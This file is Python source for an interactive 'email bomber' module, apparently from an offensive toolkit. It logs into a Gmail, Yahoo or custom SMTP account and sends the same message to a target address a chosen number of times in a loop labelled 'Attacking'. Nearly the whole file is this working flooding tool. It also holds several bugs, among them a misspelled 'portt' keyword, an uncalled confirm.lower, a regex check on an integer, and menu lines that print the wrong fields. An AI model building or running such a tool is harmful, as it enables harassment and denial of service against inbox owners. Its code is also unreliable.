import re
import smtplib
import sys
from datetime import datetime
from modules.helper import *
from getpass import getpass

class config:
    server = "smtp.gmail.com"
    port = 587

    target = "target@example.com"
    amount = 50

    email = "attacker@example.com"
    password = ""

    subject = "Hello"
    message = "World"
    

def email_bomber():
    banner.email_bomber()
    print(" " * 15 + terminal.color + "1. Target email          : " + terminal.value + str(config.target))
    print(" " * 15 + terminal.color + "2. Amount                : " + terminal.value + str(config.amount))
    print(" " * 15 + terminal.color + "3. SMTP Server           : " + terminal.value + str(config.server) + ":" + str(config.port))
    print(" " * 15 + terminal.color + "4. Email address         : " + terminal.value + str(config.email))
    print(" " * 15 + terminal.color + "5. Subject               : " + terminal.value + str(config.email))
    print(" " * 15 + terminal.color + "6. Message               : " + terminal.value + str(config.email))
    print(" " * 15 + terminal.color + "100. Return\n")
    option = input("[>] Option: ")

    if option == "":
        error(ERROR_UNSELECTED_OPTION, email_bomber)
    elif not option.isnumeric():
        error(ERROR_OPTION_NAN, email_bomber)
    elif int(option) == 1:
        target = input("[>] Target email: ")
        if target == "":
            error("Email cannot be empty.", email_bomber)
        else:
            config.target = target
            cls()
            email_bomber()
    elif int(option) == 2:
        amount = input("[>] Amount: ")
        if amount == "":
            error("Amount cannot be empty.", email_bomber)
        elif not amount.isnumeric():
            error("Amount is not a number", email_bomber)
        elif int(amount) <= 0:
            error("Amount cannot be 0 or less", email_bomber)
        else:
            config.amount = int(amount)
            cls()
            email_bomber()
    elif int(option) == 3:
        print("[i] Choose an email server:")
        print(" " * 15 + "1 - Google")
        print(" " * 15 + "2 - Yahoo")
        print(" " * 15 + "3 - Custom Server")
        server_option = int(input("[>] Option: "))
        config.port = 0
        if server_option == "":
            error(ERROR_INVALID_OPTION)
        elif int(server_option) == 1:
            config.server = "smtp.gmail.com"
            config.port = 587
            print("\n[i] Make sure you've enabled \"Less secure app access\"")
            print("[i] at https://myaccount.google.com/lesssecureapps")
            print("[i] Or use \"App passwords\"")
            print("[i] at https://myaccount.google.com/apppasswords\n")
            input("[>] Press ENTER to continue...")
            cls()
            email_bomber()
        elif int(server_option) == 2:
            config.server = "smtp.mail.yahoo.com"
            config.port = 587
            print("\n[i] Make sure to use \"App Password\" to login to your yahoo account.")
            print("[i] Generate one at https://login.yahoo.com/myaccount/security")
            cls()
            email_bomber()
        elif int(server_option) == 3:
            config.server = str(input("[>] Server: "))
            port = int(input("[>] Port: "))
            if not re.match(REGEX_PORT, port):
                error("Invalid port.", email_bomber)
            else:
                config.port = int(port)
            cls()
            email_bomber()
        else:
            error(ERROR_UNSELECTED_OPTION, email_bomber)
    elif int(option) == 4:
        email = str(input("[>] Email address: "))
        if email == "":
            error("Email cannot be empty.", email_bomber)
        else:
            config.email = email
        config.password = str(getpass("[>] Password: "))
        cls()
        email_bomber()
    elif int(option) == 5:
        config.subject = str(input("[>] Subject: "))
        cls()
        email_bomber()
    elif int(option) == 6:
        config.message = str(input("[>] Message: "))
        cls()
        email_bomber()
    elif int(option) == 99:
        confirm = input("[>] Are you sure all the informations above are all correct? (Y/n)")
        if confirm.lower == "y" or confirm == "":
            cls()
            attack()
        else:
            email_bomber()
    elif int(option) == 100:
        return
    else:
        error(ERROR_INVALID_OPTION, email_bomber)

def attack():
    print("⎯" * 50)
    print(f"[i] Server: {config.server}")
    print(f"[i] Port: {config.port}")
    print(f"[i] Target: {config.target}")
    print(f"[i] From: {config.email}\n")
    print(f"[i] Subject: {config.subject}")
    print(f"[i] Message: {config.email}")
    print("⎯" * 50)
    msg = f"From: {config.email}\nTo: {config.target}\nSubject: {config.subject}\nDate: {datetime.now()} \n\n{config.message}"

    try:
        print("[i] Connecting to SMTP server...", end="\r")
        s = smtplib.SMTP(host=config.server, portt=config.port)
        s.ehlo()
        print("[i] Setting connection to TLS...", end="\r")
        s.starttls()
        s.ehlo()
        print("[i] Logging in...", end="\r")
        s.login(user=config.email, password=config.password)

        print("[i] Attacking...")
        for i in range(1, int(config.amount) + 1):
            send_mail(s=s, fromaddr=config.email, toaddr=config.target, msg=msg)
            print(f"[i] Mail sent: {i}.", end="\r")
        s.close()
        print("[i] Finished.")
        input("[>] Press ENTER to return...")
        cls()
        email_bomber()
    except smtplib.SMTPAuthenticationError:
        error("Authentication error.", email_bomber)
        return email_bomber()
    except smtplib.SMTPServerDisconnected:
        error("Connection unexpectedly closed.", email_bomber)


def send_mail(s, fromaddr, toaddr, msg):
    try:
        s.sendmail(fromaddr, toaddr, msg)
    except Exception as err:
        print(err)
